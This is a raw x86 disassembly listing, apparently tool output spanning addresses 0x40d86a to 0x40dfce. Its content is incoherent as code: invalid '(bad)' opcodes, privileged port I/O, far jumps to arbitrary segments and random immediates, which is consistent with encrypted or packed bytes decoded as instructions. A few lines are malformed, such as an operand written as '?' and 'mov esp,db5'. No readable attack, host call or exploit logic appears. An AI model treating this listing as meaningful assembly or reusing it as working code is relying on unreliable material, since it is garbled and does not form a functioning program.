  40d86a:	xor    BYTE PTR [eax+0x1d301ec4],ch
  40d870:	xor    edi,DWORD PTR [edi]
  40d872:	ret    0xd403
  40d875:	ss sbb eax,0xb054a3ff
  40d87b:	ins    BYTE PTR es:[edi],dx
  40d87c:	and    edx,DWORD PTR [edx-0x5e6d323d]
  40d882:	sbb    esi,DWORD PTR [ebx]
  40d884:	sti    
  40d885:	lods   eax,DWORD PTR ds:[esi]
  40d886:	stos   BYTE PTR es:[edi],al
  40d887:	mov    dl,0x5b
  40d889:	mov    ah,0x37
  40d88b:	add    al,0xad
  40d88d:	daa    
  40d88e:	jecxz  0x40d8c6
  40d890:	mov    dl,0xc1
  40d892:	je     0x40d910
  40d894:	inc    edx
  40d895:	inc    edx
  40d896:	test   eax,0xd21ea057
  40d89b:	stc    
  40d89c:	(bad)  
  40d89d:	inc    eax
  40d89e:	pop    ss
  40d89f:	dec    eax
  40d8a0:	retf   0xcff2
  40d8a3:	jge    0x40d917
  40d8a5:	std    
  40d8a6:	add    esi,DWORD PTR [esi+eax*2+0x9]
  40d8aa:	cmp    dl,BYTE PTR [eax-0x34]
  40d8ad:	int3   
  40d8ae:	out    dx,al
  40d8af:	xor    al,0xd7
  40d8b1:	add    bl,BYTE PTR [edx+edi*4]
  40d8b4:	xchg   esi,eax
  40d8b5:	leave  
  40d8b6:	ret    
  40d8b7:	pop    ds
  40d8b8:	xchg   bl,bh
  40d8ba:	adc    bl,0x2a
  40d8bd:	fbstp  TBYTE PTR [esi+0x4b]
  40d8c0:	aaa    
  40d8c1:	in     al,dx
  40d8c2:	dec    ebx
  40d8c3:	std    
  40d8c4:	xchg   ebp,eax
  40d8c5:	xor    ecx,DWORD PTR [esi]
  40d8c7:	mov    esi,0xd0aa3dea
  40d8cc:	scas   eax,DWORD PTR es:[edi]
  40d8cd:	stos   BYTE PTR es:[edi],al
  40d8ce:	sub    ah,BYTE PTR [ecx+0x48a42d04]
  40d8d4:	out    0xa9,al
  40d8d6:	daa    
  40d8d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8d8:	cwde   
  40d8d9:	jge    0x40d879
  40d8db:	push   es
  40d8dc:	lahf   
  40d8dd:	cs jle 0x40d8c0
  40d8e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8e1:	icebp  
  40d8e2:	jns    0x40d8a8
  40d8e4:	and    edx,DWORD PTR [edi-0x66]
  40d8e7:	mov    edi,0xd9dd456f
  40d8ec:	jecxz  0x40d890
  40d8ee:	add    BYTE PTR [ebx+0x1107fe8c],al
  40d8f4:	jne    0x40d896
  40d8f6:	mov    bh,0xa2
  40d8f8:	mov    bl,0xc7
  40d8fa:	hlt    
  40d8fb:	retf   
  40d8fc:	cmp    eax,0x4c6d180d
  40d901:	test   DWORD PTR ds:0x41fbf370,edi
  40d907:	mov    al,0xc4
  40d909:	cld    
  40d90a:	sub    DWORD PTR [edi-0x1],ebp
  40d90d:	xor    al,BYTE PTR [edi-0x6d5566d3]
  40d913:	or     bh,BYTE PTR [edx+0xe]
  40d916:	and    ch,BYTE PTR [edx-0xf]
  40d919:	add    DWORD PTR [ebp-0xbc4bbd8],ebx
  40d91f:	fwait
  40d920:	push   esi
  40d921:	adc    BYTE PTR [ebx+0x2816867],cl
  40d927:	xor    bl,BYTE PTR [eax+0x5e]
  40d92a:	das    
  40d92b:	call   DWORD PTR [edi]
  40d92d:	xor    BYTE PTR [ebp+eiz*4+0x541a072a],cl
  40d934:	rcr    BYTE PTR [edi+0xbb8ef22],1
  40d93a:	xchg   ecx,eax
  40d93b:	xchg   esi,eax
  40d93c:	aad    0xb8
  40d93e:	dec    esp
  40d93f:	test   ah,0x2b
  40d942:	out    dx,eax
  40d943:	mov    ecx,0xfa9ccf88
  40d948:	cmp    BYTE PTR [bx+si],dh
  40d94b:	cmp    ah,BYTE PTR [ebp-0x6df37822]
  40d951:	pop    ecx
  40d952:	adc    ebx,DWORD PTR ds:0xca221385
  40d958:	data16 imul bh
  40d95b:	push   ebx
  40d95c:	and    al,0xd6
  40d95e:	pop    ds
  40d95f:	ja     0x40d97b
  40d961:	fnstenv [edx-0x22]
  40d964:	xlat   BYTE PTR ds:[ebx]
  40d965:	scas   al,BYTE PTR es:[edi]
  40d966:	xor    ecx,ecx
  40d968:	xor    bl,BYTE PTR [esi]
  40d96a:	sbb    eax,0x1171d516
  40d96f:	mov    ah,0xd1
  40d971:	add    al,0x4
  40d973:	test   DWORD PTR [ebx],ebp
  40d975:	sub    BYTE PTR [edi],0xca
  40d978:	inc    esi
  40d979:	clc    
  40d97a:	inc    ebx
  40d97b:	enter  0xa8ee,0x4d
  40d97f:	sub    BYTE PTR [ebp+0x63227148],dh
  40d985:	mov    al,0xda
  40d987:	or     al,0x49
  40d989:	sbb    DWORD PTR [edx-0x48a43454],ecx
  40d98f:	frstor [ecx+eiz*8]
  40d992:	push   cs
  40d993:	or     al,0x10
  40d995:	rol    DWORD PTR [esi-0x5c],cl
  40d998:	inc    BYTE PTR es:0xbc7cebfd
  40d99f:	add    eax,0x43e3ef00
  40d9a4:	add    al,BYTE PTR ds:0xf0978ac8
  40d9aa:	iret   
  40d9ab:	adc    ch,ah
  40d9ad:	xor    al,0xd5
  40d9af:	jecxz  0x40da10
  40d9b1:	adc    al,0x7c
  40d9b3:	cmp    al,bl
  40d9b5:	pop    ecx
  40d9b6:	ins    BYTE PTR es:[edi],dx
  40d9b7:	das    
  40d9b8:	pop    esi
  40d9b9:	arpl   WORD PTR gs:[edx-0x76],sp
  40d9bd:	fwait
  40d9be:	dec    esp
  40d9bf:	lods   eax,DWORD PTR ds:[esi]
  40d9c0:	aas    
  40d9c1:	mov    eax,0x6b069713
  40d9c6:	xor    ch,BYTE PTR [esi-0x5f]
  40d9c9:	adc    BYTE PTR [edi+edi*1],ch
  40d9cc:	push   ecx
  40d9cd:	mov    ebp,0xbf08fd1c
  40d9d2:	mov    eax,0x5a18c524
  40d9d7:	fs fwait
  40d9d9:	dec    edi
  40d9da:	stc    
  40d9db:	push   0x77
  40d9dd:	mov    WORD PTR [edx-0x1f],cs
  40d9e0:	cmp    BYTE PTR [edi-0x689e2596],dh
  40d9e6:	and    bh,BYTE PTR [ebx-0x69ad6089]
  40d9ec:	cld    
  40d9ed:	pushf  
  40d9ee:	clc    
  40d9ef:	pushf  
  40d9f0:	cmp    esi,DWORD PTR [esi+0xf2765b0]
  40d9f6:	test   ebx,ebp
  40d9f8:	add    BYTE PTR [ebx],dh
  40d9fa:	xchg   ebx,eax
  40d9fb:	mov    ebp,0x131bff74
  40da00:	xchg   edi,eax
  40da01:	jb     0x40d99a
  40da03:	mov    edx,0xe081709b
  40da08:	jo     0x40da0d
  40da0a:	loope  0x40d9f7
  40da0c:	push   DWORD PTR [ecx-0x1bf5566e]
  40da12:	cmp    BYTE PTR [ecx-0xc],bh
  40da15:	sub    ebx,0xbe6d2e09
  40da1b:	adc    DWORD PTR [ecx],0x8e8b75fb
  40da21:	sbb    eax,0x49bf9bc8
  40da26:	aam    0xdd
  40da28:	push   0x58
  40da2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da2b:	das    
  40da2c:	push   cs
  40da2d:	jb     0x40daad
  40da2f:	popf   
  40da30:	sbb    eax,0xdb3a4ae8
  40da35:	(bad)  [eax]
  40da37:	(bad)  ds:0x8b87
  40da3d:	loopne 0x40daa9
  40da3f:	dec    BYTE PTR [esi-0x1e189324]
  40da45:	sbb    bh,BYTE PTR [edi-0x4d]
  40da48:	or     eax,0x431dca3f
  40da4d:	mov    esp,0x5e0659a5
  40da52:	and    DWORD PTR [ecx*2+0x520db589],eax
  40da59:	sub    ecx,ebx
  40da5b:	pop    ds
  40da5c:	test   BYTE PTR [ebp+eiz*2-0x42],dl
  40da60:	cdq    
  40da61:	xor    ebx,ebx
  40da63:	or     esi,DWORD PTR [ecx+ebp*2+0x51]
  40da67:	or     eax,0x9661bda2
  40da6c:	mov    al,ds:0x1d719dea
  40da71:	fadd   QWORD PTR [esi+eiz*8+0x4f351167]
  40da78:	fbstp  TBYTE PTR [ecx+0xf]
  40da7b:	ret    
  40da7c:	fiadd  WORD PTR [eax]
  40da7e:	out    dx,al
  40da7f:	push   esp
  40da80:	fwait
  40da81:	clc    
  40da82:	inc    edi
  40da83:	mov    ds:0xb7f9aa28,al
  40da88:	mov    bh,0x43
  40da8a:	lea    ebp,ds:[edi]
  40da8d:	sti    
  40da8e:	int3   
  40da8f:	pusha  
  40da90:	fld    QWORD PTR [edi]
  40da92:	dec    esi
  40da93:	out    dx,eax
  40da94:	popa   
  40da95:	jle    0x40da42
  40da97:	jmp    0x1100:0xc6b147a1
  40da9e:	sub    eax,DWORD PTR [ecx]
  40daa0:	imul   edi,edx,0xffffffa0
  40daa3:	jnp    0x40da36
  40daa5:	aas    
  40daa6:	jl     0x40da3e
  40daa8:	xlat   BYTE PTR ds:[ebx]
  40daa9:	lds    esi,FWORD PTR [ecx]
  40daab:	pop    es
  40daac:	and    esp,eax
  40daae:	dec    esp
  40daaf:	jnp    0x40db1b
  40dab1:	inc    ecx
  40dab2:	popa   
  40dab3:	adc    esi,ecx
  40dab5:	push   esi
  40dab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab7:	data16 faddp st(5),st
  40daba:	inc    eax
  40dabb:	arpl   WORD PTR [eax],bx
  40dabd:	xchg   esi,eax
  40dabe:	sub    esp,DWORD PTR [ecx+0xd5301e6]
  40dac4:	aad    0x56
  40dac6:	pop    ebp
  40dac7:	dec    ebp
  40dac8:	inc    eax
  40dac9:	mov    WORD PTR [ebx+0x13],?
  40dacc:	pop    ds
  40dacd:	daa    
  40dace:	mov    bl,0x83
  40dad0:	mov    dl,0x61
  40dad2:	stos   BYTE PTR es:[edi],al
  40dad3:	xchg   edi,eax
  40dad4:	xchg   edi,eax
  40dad5:	out    0xf7,eax
  40dad7:	(bad)  
  40dad8:	(bad)  [ebp+0x6f598ebc]
  40dade:	repz dec edx
  40dae0:	mov    esi,0x21f59810
  40dae5:	stos   BYTE PTR es:[edi],al
  40dae6:	rcr    DWORD PTR [esi+ecx*2+0x48b2b784],1
  40daed:	(bad)  
  40daee:	adc    BYTE PTR [ecx-0xa],dl
  40daf1:	mov    ds:0xd0b01ba5,eax
  40daf6:	push   ss
  40daf7:	cmp    DWORD PTR [eax],eax
  40daf9:	xor    al,0xaa
  40dafb:	sub    ah,BYTE PTR [esi+ebp*1]
  40dafe:	into   
  40daff:	dec    ebx
  40db00:	mov    bl,0xba
  40db02:	ins    DWORD PTR es:[edi],dx
  40db03:	in     eax,0x2e
  40db05:	scas   al,BYTE PTR es:[edi]
  40db06:	shl    edi,1
  40db08:	or     DWORD PTR es:[eax-0x55d83784],edx
  40db0f:	imul   ebp,ebp,0x62f34e91
  40db15:	inc    ebx
  40db16:	leave  
  40db17:	and    edx,DWORD PTR [edx+0x2d]
  40db1a:	push   ebp
  40db1b:	xor    DWORD PTR [ebx-0x641e3d9b],edx
  40db21:	ret    
  40db22:	mov    esp,0xb85b1d12
  40db27:	jge    0x40daca
  40db29:	cmp    BYTE PTR ds:0xc6a7c688,0x2e
  40db30:	xchg   esi,eax
  40db31:	cmc    
  40db32:	mov    BYTE PTR [ecx+0xf],0xb3
  40db36:	or     ebp,eax
  40db38:	cmp    BYTE PTR [esp+eiz*4],0x2a
  40db3c:	sbb    BYTE PTR [edi],ch
  40db3e:	frstor [edi-0x14]
  40db41:	add    BYTE PTR [edi],dl
  40db43:	jno    0x40daeb
  40db45:	(bad)  
  40db46:	fs dec edi
  40db48:	jecxz  0x40daf7
  40db4a:	mov    dl,0xea
  40db4c:	jne    0x40dbcd
  40db4e:	push   0x5e
  40db50:	mov    edx,0x44f51219
  40db55:	hlt    
  40db56:	sar    BYTE PTR [edi-0x79615ba3],1
  40db5c:	inc    ecx
  40db5d:	or     BYTE PTR [esi],bl
  40db5f:	test   BYTE PTR [ecx+0x6848d7aa],al
  40db65:	fimul  WORD PTR [esi-0x6201d26f]
  40db6b:	jne    0x40dbdf
  40db6d:	jmp    0x698a:0xb867c924
  40db74:	xlat   BYTE PTR ds:[ebx]
  40db75:	dec    edi
  40db76:	(bad)
  40db7a:	(bad)  [edi-0x32]
  40db7d:	out    0x12,eax
  40db7f:	imul   ebx,edx,0x1c
  40db82:	dec    esi
  40db83:	mov    ah,0x35
  40db85:	add    al,0xff
  40db87:	ja     0x40db6f
  40db89:	push   eax
  40db8a:	xchg   DWORD PTR [edx+0x38],ecx
  40db8d:	mov    bl,0x75
  40db8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db90:	and    al,BYTE PTR [edi+0x6c]
  40db93:	leave  
  40db94:	shr    bh,1
  40db96:	jne    0x40dc03
  40db98:	out    dx,al
  40db99:	jne    0x40db54
  40db9b:	jnp    0x40db52
  40db9d:	jl     0x40db88
  40db9f:	adc    DWORD PTR [edi],eax
  40dba1:	push   ebx
  40dba2:	stos   DWORD PTR es:[edi],eax
  40dba3:	or     DWORD PTR [edx-0x6b4950e4],edx
  40dba9:	int3   
  40dbaa:	cwde   
  40dbab:	jle    0x40dbb5
  40dbad:	add    ebx,ecx
  40dbaf:	(bad)  
  40dbb1:	xchg   ebp,eax
  40dbb2:	into   
  40dbb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbb4:	and    al,0x28
  40dbb6:	sbb    al,BYTE PTR [edi-0x39432229]
  40dbbc:	cmp    dh,bh
  40dbbe:	std    
  40dbbf:	ds and al,0xb2
  40dbc2:	dec    edx
  40dbc3:	out    0x1b,al
  40dbc5:	nop
  40dbc6:	je     0x40dc11
  40dbc8:	dec    ecx
  40dbc9:	shr    BYTE PTR [edi+0x38],0xd0
  40dbcd:	nop
  40dbce:	xchg   ebx,eax
  40dbcf:	jo     0x40dc06
  40dbd1:	ret    0xe0fe
  40dbd4:	adc    DWORD PTR ds:0x11aaba49,edi
  40dbda:	mov    dl,0x89
  40dbdc:	xchg   esp,eax
  40dbdd:	xor    cl,0x7f
  40dbe0:	sub    al,0x15
  40dbe2:	jle    0x40db9d
  40dbe4:	push   ss
  40dbe5:	push   ss
  40dbe6:	mov    al,0x24
  40dbe8:	adc    BYTE PTR [edi-0x28],dl
  40dbeb:	sub    DWORD PTR [ebx+0x41],0x11
  40dbef:	lea    ecx,[esi+0x1f4083c4]
  40dbf5:	push   ecx
  40dbf6:	jecxz  0x40db8f
  40dbf8:	mov    BYTE PTR [eax-0x4c],0xde
  40dbfc:	imul   esp,DWORD PTR [eax+0x57],0x690024ca
  40dc03:	dec    edx
  40dc04:	xchg   esp,eax
  40dc05:	stos   DWORD PTR es:[edi],eax
  40dc06:	ret    
  40dc07:	mov    al,0x34
  40dc09:	adc    ah,ch
  40dc0b:	pushf  
  40dc0c:	or     DWORD PTR [edx-0x7e9dad4c],ecx
  40dc12:	push   edx
  40dc13:	pop    esp
  40dc14:	xchg   edi,eax
  40dc15:	das    
  40dc16:	arpl   WORD PTR [eax-0x7c],dx
  40dc19:	std    
  40dc1a:	out    dx,eax
  40dc1b:	xchg   DWORD PTR [eax+0x127926a3],esi
  40dc21:	mov    cs,WORD PTR [ebx+0x3f]
  40dc24:	or     al,0x8e
  40dc26:	xor    BYTE PTR [edi],al
  40dc28:	sub    eax,0x7e1f9e6e
  40dc2d:	jmp    0x40dc02
  40dc2f:	jbe    0x40dc0d
  40dc31:	je     0x40dc89
  40dc33:	sub    eax,ecx
  40dc35:	or     dh,BYTE PTR [ecx-0x1cd23da3]
  40dc3b:	cmp    ecx,DWORD PTR ds:0xa0455689
  40dc41:	sahf   
  40dc42:	add    DWORD PTR [ebx],esi
  40dc44:	add    bh,BYTE PTR [edx]
  40dc46:	push   eax
  40dc47:	dec    ecx
  40dc48:	cld    
  40dc49:	dec    edx
  40dc4a:	push   edx
  40dc4b:	pop    ebx
  40dc4c:	xor    bh,ah
  40dc4e:	sahf   
  40dc4f:	mov    edx,0xbd514212
  40dc54:	sahf   
  40dc55:	and    ebp,DWORD PTR [edi-0x2c80854f]
  40dc5b:	cmp    edx,ebp
  40dc5d:	lds    ebp,FWORD PTR [eax+0x6864eb5c]
  40dc63:	popf   
  40dc64:	(bad)  
  40dc66:	dec    edi
  40dc67:	mov    DWORD PTR [ebp+0x700a9e90],esi
  40dc6d:	fwait
  40dc6e:	scas   al,BYTE PTR es:[edi]
  40dc6f:	out    dx,eax
  40dc70:	int3   
  40dc71:	vaddsubpd ymm0,ymm2,YMMWORD PTR [esi+0x5c]
  40dc76:	mov    ebx,DWORD PTR [ecx+0x2427dfd5]
  40dc7c:	xchg   DWORD PTR [eax-0x2d4e23cf],esi
  40dc82:	dec    eax
  40dc83:	fs cmc 
  40dc85:	repz (bad) 
  40dc87:	mov    bh,0x97
  40dc89:	clc    
  40dc8a:	push   edx
  40dc8b:	xchg   esp,eax
  40dc8c:	xchg   edx,eax
  40dc8d:	pop    ds
  40dc8e:	sbb    ch,BYTE PTR [edx-0x7ff31fca]
  40dc94:	xor    DWORD PTR [edi],0x928d6059
  40dc9a:	retf   0x1824
  40dc9d:	mov    WORD PTR cs:[ebp-0x24043656],cs
  40dca4:	xchg   esi,ebx
  40dca6:	ss test edi,esi
  40dca9:	sub    DWORD PTR [ecx],ecx
  40dcab:	and    cl,BYTE PTR [eax-0xf2f1493]
  40dcb1:	gs (bad) 
  40dcb3:	sti    
  40dcb4:	sub    al,0xae
  40dcb6:	call   0xac76:0xd1c3c21f
  40dcbd:	retf   
  40dcbe:	fs pop eax
  40dcc0:	dec    esp
  40dcc1:	cmp    DWORD PTR [esi],edi
  40dcc3:	or     esp,DWORD PTR [ecx+0x6f]
  40dcc6:	xor    BYTE PTR gs:[ebp-0x23],bl
  40dcca:	mov    ds,WORD PTR [edi]
  40dccc:	push   ebx
  40dccd:	jb     0x40dcff
  40dccf:	mov    bh,0xa8
  40dcd1:	(bad)  
  40dcd2:	mov    dl,0xc9
  40dcd4:	xor    edi,DWORD PTR [ecx]
  40dcd6:	and    eax,0x40e1e31d
  40dcdb:	sbb    al,BYTE PTR [ebp-0x3a]
  40dcde:	mov    esp,0x83532102
  40dce3:	out    0x9,al
  40dce5:	lds    ecx,FWORD PTR [eax]
  40dce7:	sbb    eax,0x13ecbb8
  40dcec:	in     al,dx
  40dced:	add    BYTE PTR [ebx+eiz*2],bh
  40dcf0:	inc    edx
  40dcf1:	jmp    0xfdba:0x9c803aca
  40dcf8:	add    dl,BYTE PTR [ebx-0x62f7a6c]
  40dcfe:	loope  0x40dcfe
  40dd00:	mov    es,ecx
  40dd02:	cwde   
  40dd03:	test   al,0x98
  40dd05:	mov    edx,0x9e68c3c9
  40dd0a:	sbb    bh,BYTE PTR [ebp+ebx*4+0x34956756]
  40dd11:	in     al,dx
  40dd12:	clc    
  40dd13:	pop    es
  40dd14:	dec    ecx
  40dd15:	push   0x5ab4624a
  40dd1a:	sbb    eax,0x6590ae21
  40dd1f:	fwait
  40dd20:	cli    
  40dd21:	xchg   ebx,eax
  40dd22:	pop    ds
  40dd23:	loopne 0x40dcd7
  40dd25:	mov    dh,0xf2
  40dd27:	mov    ebp,0xb97481a2
  40dd2c:	loope  0x40dd34
  40dd2e:	shl    DWORD PTR [esi+0x22],cl
  40dd31:	mov    ch,BYTE PTR [ecx+0x55b6ee23]
  40dd37:	imul   edx,DWORD PTR [edi-0x49],0x8350d520
  40dd3e:	scas   eax,DWORD PTR es:[edi]
  40dd3f:	into   
  40dd40:	cmp    dh,0xc5
  40dd43:	cs jae 0x40dce2
  40dd46:	add    BYTE PTR [ebx-0x6f7b78cd],bl
  40dd4c:	retf   
  40dd4d:	push   es
  40dd4e:	mov    ah,0x5f
  40dd50:	scas   eax,DWORD PTR es:[edi]
  40dd51:	dec    ebp
  40dd52:	push   edi
  40dd53:	aad    0x77
  40dd55:	in     eax,0x7c
  40dd57:	cmp    eax,DWORD PTR [eax-0x5b]
  40dd5a:	or     al,0x92
  40dd5c:	add    eax,0x696757d3
  40dd61:	xchg   edx,eax
  40dd62:	mov    esi,0x371f9357
  40dd67:	hlt    
  40dd68:	adc    eax,DWORD PTR [ebp-0x1046c82d]
  40dd6e:	jns    0x40dcf1
  40dd70:	mov    esp,db5
  40dd73:	popf   
  40dd74:	xchg   edi,eax
  40dd75:	add    eax,eax
  40dd77:	mov    al,ds:0x81de7585
  40dd7c:	push   ss
  40dd7d:	add    BYTE PTR [ebx],0xef
  40dd80:	mov    al,0x66
  40dd82:	inc    ecx
  40dd83:	jmp    0x6622b0f3
  40dd88:	loop   0x40dd0a
  40dd8a:	xor    dh,0x90
  40dd8d:	push   ss
  40dd8e:	mov    ds:0x47f61d2d,eax
  40dd93:	test   al,0xd
  40dd95:	cld    
  40dd96:	shr    DWORD PTR [ebp+0x45a7c835],cl
  40dd9c:	ins    BYTE PTR es:[edi],dx
  40dd9d:	mov    edi,edi
  40dd9f:	jle    0x40dd24
  40dda1:	clc    
  40dda2:	cmc    
  40dda3:	dec    ebp
  40dda4:	xor    BYTE PTR [ecx],0xd1
  40dda7:	stos   BYTE PTR es:[edi],al
  40dda8:	stc    
  40dda9:	xchg   ebp,eax
  40ddaa:	mov    bl,0x1d
  40ddac:	clc    
  40ddad:	mov    edx,0x77a12bc8
  40ddb2:	ds dec edx
  40ddb4:	add    bh,0x75
  40ddb7:	leave  
  40ddb8:	add    dl,BYTE PTR [ebp-0x4496efed]
  40ddbe:	ins    DWORD PTR es:[edi],dx
  40ddbf:	pop    esp
  40ddc0:	test   al,0x2e
  40ddc2:	sbb    al,0x87
  40ddc4:	dec    edx
  40ddc5:	pusha  
  40ddc6:	inc    edi
  40ddc7:	inc    esp
  40ddc8:	lods   eax,DWORD PTR ds:[esi]
  40ddc9:	adc    BYTE PTR [ecx+0x54753141],dl
  40ddcf:	push   ds
  40ddd0:	inc    eax
  40ddd1:	inc    ebx
  40ddd2:	stc    
  40ddd3:	jne    0x40dd67
  40ddd5:	(bad)  
  40ddd7:	je     0x40de54
  40ddd9:	cmp    al,0xad
  40dddb:	mov    eax,ds:0x47110357
  40dde0:	mov    ds:0x850dd55b,eax
  40dde5:	jmp    0x40dd7c
  40dde7:	inc    edi
  40dde8:	mov    dh,0xa0
  40ddea:	cmp    dh,BYTE PTR [ebp-0x22]
  40dded:	jecxz  0x40ddd0
  40ddef:	pop    esi
  40ddf0:	push   esp
  40ddf1:	imul   ebp,DWORD PTR [ebp+0x3f],0x71d939a4
  40ddf8:	mov    esi,0x69507756
  40ddfd:	mov    esp,0xfa6cff88
  40de02:	inc    ebx
  40de03:	jno    0x40de0a
  40de05:	in     eax,dx
  40de06:	call   0x5cfc:0x2743efb8
  40de0d:	sbb    al,0xc4
  40de0f:	pop    ebx
  40de10:	loope  0x40de5d
  40de12:	push   edi
  40de13:	sbb    edx,DWORD PTR [eax]
  40de15:	lods   al,BYTE PTR ds:[esi]
  40de16:	pop    ecx
  40de17:	add    al,dh
  40de19:	test   BYTE PTR [ebx-0x3f],al
  40de1c:	mov    DWORD PTR [edx],ebx
  40de1e:	and    eax,DWORD PTR [ebp-0x2ffa1342]
  40de24:	cmp    edx,DWORD PTR [ebx]
  40de26:	mov    edx,0xd61824ff
  40de2b:	(bad)  
  40de2d:	mov    esi,0xc42c695a
  40de32:	into   
  40de33:	xor    al,0xf
  40de35:	push   eax
  40de36:	retf   
  40de37:	out    0xf7,eax
  40de39:	mov    ds:0xbf2be787,eax
  40de3e:	push   edx
  40de3f:	lea    ebp,ds:0xb09c095d
  40de45:	lea    ecx,[ebp+0x699d5d]
  40de4b:	(bad)  
  40de4d:	sub    eax,0x46e5031
  40de52:	hlt    
  40de53:	push   ss
  40de54:	inc    esp
  40de55:	push   ebp
  40de56:	mov    cl,0xd
  40de58:	int3   
  40de59:	retf   0xd49c
  40de5c:	cmp    cl,BYTE PTR [edi]
  40de5e:	sbb    edx,DWORD PTR [ecx-0xe1ae84c]
  40de64:	fstp   TBYTE PTR [esi]
  40de66:	les    ecx,FWORD PTR [edi-0x24418575]
  40de6c:	jns    0x40de7e
  40de6e:	push   ebx
  40de6f:	sbb    ebx,esp
  40de71:	mov    ah,dh
  40de73:	nop
  40de74:	mov    dh,0x22
  40de76:	inc    esi
  40de77:	pop    edi
  40de78:	push   ds
  40de79:	push   ebx
  40de7a:	scas   eax,DWORD PTR es:[edi]
  40de7b:	cwde   
  40de7c:	rcl    BYTE PTR [ebx-0x457a51b2],0x88
  40de83:	and    ebx,ecx
  40de85:	jb     0x40deff
  40de87:	inc    ebx
  40de88:	imul   edi,DWORD PTR [ecx+0x22],0x31
  40de8c:	icebp  
  40de8d:	adc    BYTE PTR cs:[ebx],0xd
  40de91:	lods   al,BYTE PTR ds:[esi]
  40de92:	push   eax
  40de93:	std    
  40de94:	stos   BYTE PTR es:[edi],al
  40de95:	repz pop esi
  40de97:	mov    ebp,0xdc662c4a
  40de9c:	add    DWORD PTR [edx-0x80],esp
  40de9f:	xchg   esi,eax
  40dea0:	shl    BYTE PTR [eax-0x631a2196],cl
  40dea6:	mov    cl,0x2e
  40dea8:	mov    ds:0x13d579fc,al
  40dead:	push   eax
  40deae:	mov    edi,0x2244988b
  40deb3:	hlt    
  40deb4:	lock push edi
  40deb6:	inc    esi
  40deb7:	ror    BYTE PTR [edx-0x769adc63],0x9c
  40debe:	xchg   ebp,eax
  40debf:	cwde   
  40dec0:	mov    ch,0x6a
  40dec2:	pop    ebp
  40dec3:	rcr    DWORD PTR [esi],cl
  40dec5:	fcomp  st(7)
  40dec7:	pop    esp
  40dec8:	inc    ebp
  40dec9:	retf   
  40deca:	fwait
  40decb:	scas   al,BYTE PTR es:[edi]
  40decc:	or     al,0xfe
  40dece:	stos   DWORD PTR es:[edi],eax
  40decf:	mov    al,BYTE PTR [edx]
  40ded1:	imul   ebx,DWORD PTR [ecx+0x15d66ce],0xb5896577
  40dedb:	loopne 0x40de83
  40dedd:	nop
  40dede:	jbe    0x40df31
  40dee0:	enter  0x2a64,0x25
  40dee4:	pop    eax
  40dee5:	push   esp
  40dee6:	dec    ecx
  40dee7:	jecxz  0x40df52
  40dee9:	loop   0x40de96
  40deeb:	jne    0x40deaf
  40deed:	ret    0x9729
  40def0:	xchg   esi,eax
  40def1:	mov    ebp,0x1d73fa57
  40def6:	(bad)  
  40def7:	mov    ch,0x76
  40def9:	mov    esp,0x42a5970
  40defe:	(bad)  
  40deff:	je     0x40df12
  40df01:	shr    BYTE PTR [edx],0x17
  40df04:	pushf  
  40df05:	push   es
  40df06:	call   eax
  40df08:	scas   eax,DWORD PTR es:[edi]
  40df09:	sar    ecx,1
  40df0b:	xchg   ebx,eax
  40df0c:	push   0x3b
  40df0e:	sub    esp,DWORD PTR ds:[ebx+0x71667165]
  40df15:	and    BYTE PTR [esi+0x7b],bl
  40df18:	jmp    0xbea6eea4
  40df1d:	inc    eax
  40df1e:	mov    ebx,ecx
  40df20:	out    dx,eax
  40df21:	adc    al,0x42
  40df23:	mov    ch,ah
  40df25:	jmp    0x518e:0xa49e1af5
  40df2c:	push   0x2015d720
  40df31:	aaa    
  40df32:	punpckhwd mm1,QWORD PTR [ecx-0x28]
  40df36:	push   esp
  40df37:	and    cl,ah
  40df39:	pop    ds
  40df3a:	and    esi,DWORD PTR [ebx]
  40df3c:	(bad)  
  40df3d:	and    edx,edx
  40df3f:	(bad)  
  40df40:	sbb    al,0xd9
  40df42:	xchg   esp,eax
  40df43:	sub    eax,0xe035f767
  40df48:	xlat   BYTE PTR ds:[ebx]
  40df49:	mov    bh,0xba
  40df4b:	xchg   ebp,eax
  40df4c:	(bad)  
  40df4d:	fcom   QWORD PTR [edx+0x711d618c]
  40df53:	out    dx,al
  40df54:	shr    BYTE PTR [eax+0x2c],cl
  40df57:	ja     0x40df0e
  40df59:	pop    esp
  40df5a:	add    eax,0x123899c5
  40df5f:	(bad)  
  40df60:	loopne 0x40dfb9
  40df62:	jbe    0x40def4
  40df64:	(bad)  
  40df65:	fsubp  st(3),st
  40df67:	ret    
  40df68:	push   cs
  40df69:	xor    al,0x3f
  40df6b:	es pop edx
  40df6d:	jmp    0x8ce2:0xb4e5c8f3
  40df74:	loope  0x40df29
  40df76:	shl    dl,1
  40df78:	scas   eax,DWORD PTR es:[edi]
  40df79:	addr16 int 0x9c
  40df7c:	lahf   
  40df7d:	popa   
  40df7e:	jae    0x40df2f
  40df80:	sub    al,0xc7
  40df82:	(bad)  
  40df83:	ror    edx,0xd5
  40df86:	bnd je 0x40dfcf
  40df89:	pop    eax
  40df8a:	mov    fs,WORD PTR [edi+0x12]
  40df8d:	ja     0x40df66
  40df8f:	inc    edi
  40df90:	jg     0x40df91
  40df92:	mov    ds:0xbf1e0a19,eax
  40df97:	cmp    al,0x2c
  40df99:	adc    ah,cl
  40df9b:	mov    al,ds:0x4d2baf3b
  40dfa0:	sub    eax,DWORD PTR [eax+0x7e]
  40dfa3:	push   ds
  40dfa4:	scas   al,BYTE PTR es:[edi]
  40dfa5:	lahf   
  40dfa6:	mov    DWORD PTR [edi],edx
  40dfa8:	jmp    FWORD PTR [eax]
  40dfaa:	add    BYTE PTR [ebx],dl
  40dfac:	mov    edi,esp
  40dfae:	sub    DWORD PTR [edx-0x55],edx
  40dfb1:	sub    al,0x69
  40dfb3:	mov    esp,0xf7c089ad
  40dfb8:	push   ecx
  40dfb9:	clc    
  40dfba:	push   ebp
  40dfbb:	rol    BYTE PTR [edi+0x1ce68146],1
  40dfc1:	sub    esp,ebp
  40dfc3:	js     0x40dfa0
  40dfc5:	rol    BYTE PTR [ebp+0x32],0x92
  40dfc9:	int    0x92
  40dfcb:	mov    dh,0xf0
  40dfcd:	push   esi
  40dfce:	je     0x40e00e
